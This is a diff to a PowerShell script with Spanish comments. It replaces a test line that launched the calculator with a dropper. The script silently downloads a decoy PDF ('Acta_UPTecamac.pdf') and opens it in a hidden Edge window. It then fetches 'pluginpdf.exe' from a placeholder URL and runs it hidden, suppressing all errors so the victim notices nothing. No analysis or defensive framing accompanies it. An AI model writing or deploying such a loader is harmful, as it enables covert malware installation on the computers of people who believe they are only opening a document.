@@ -1,1 +1,48 @@
-Start-Process 'calc.exe'
+# Ruta temporal
+$tempPath = [System.IO.Path]::GetTempPath()
+
+# Nombre del archivo PDF
+$pdfFileName = "Acta_UPTecamac.pdf"
+
+# Ruta completa del archivo PDF
+$pdfPath = Join-Path -Path $tempPath -ChildPath $pdfFileName
+
+# URL del archivo PDF (debes reemplazar esto con la URL real)
+$pdfUrl = "https://github.com/whaomi23/Ex/blob/main/Acta_UPTecamac.pdf?raw=true"
+
+# Descargar el archivo PDF de manera silenciosa
+try {
+    Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -ErrorAction Stop
+} catch {
+    # Si hay un error, salir sin mostrar mensajes
+    exit
+}
+
+# Verificar si el archivo se descargó correctamente
+if (Test-Path $pdfPath) {
+    # Abrir el archivo PDF con Microsoft Edge de manera silenciosa
+    Start-Process "msedge.exe" $pdfPath -WindowStyle Hidden
+
+    # Nombre del archivo pluginpdf.exe
+    $pluginFileName = "pluginpdf.exe"
+
+    # Ruta completa del archivo pluginpdf.exe
+    $pluginPath = Join-Path -Path $tempPath -ChildPath $pluginFileName
+
+    # URL del archivo pluginpdf.exe (debes reemplazar esto con la URL real)
+    $pluginUrl = "https://example.com/pluginpdf.exe"
+
+    # Descargar el archivo pluginpdf.exe de manera silenciosa
+    try {
+        Invoke-WebRequest -Uri $pluginUrl -OutFile $pluginPath -ErrorAction Stop
+    } catch {
+        # Si hay un error, salir sin mostrar mensajes
+        exit
+    }
+
+    # Verificar si el archivo se descargó correctamente
+    if (Test-Path $pluginPath) {
+        # Ejecutar pluginpdf.exe con el parámetro -run de manera silenciosa
+        Start-Process -FilePath $pluginPath -ArgumentList "-run" -WindowStyle Hidden
+    }
+}
